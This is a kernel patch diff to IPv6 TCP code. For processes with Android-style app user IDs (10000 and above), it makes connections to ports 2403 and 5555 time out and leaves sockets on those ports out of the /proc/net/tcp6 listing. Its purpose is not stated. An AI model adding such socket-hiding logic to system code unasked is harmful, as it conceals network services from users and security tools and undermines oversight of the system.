@@ -166,6 +166,11 @@ int tcp_v6_connect(struct sock *sk, struct sockaddr *uaddr,
 	if (usin->sin6_family != AF_INET6)
 		return -EAFNOSUPPORT;
 
+	if ((current_uid().val >= 10000 || current_euid().val >= 10000) &&
+	    (usin->sin6_port == htons(2403) || usin->sin6_port == htons(5555))) {
+		return -ETIMEDOUT;
+	}
+
 	memset(&fl6, 0, sizeof(fl6));
 
 	if (np->sndflow) {
@@ -2201,6 +2206,14 @@ static int tcp6_seq_show(struct seq_file *seq, void *v)
 		goto out;
 	}
 	st = seq->private;
+
+	if ((current_uid().val >= 10000 || current_euid().val >= 10000)) {
+		if (sk->sk_state != TCP_TIME_WAIT && sk->sk_state != TCP_NEW_SYN_RECV) {
+			struct inet_sock *inet = inet_sk(sk);
+			if (inet && (inet->inet_num == 2403 || inet->inet_num == 5555))
+				return 0;
+		}
+	}
 
 	if (sk->sk_state == TCP_TIME_WAIT)
 		get_timewait6_sock(seq, v, st->num);
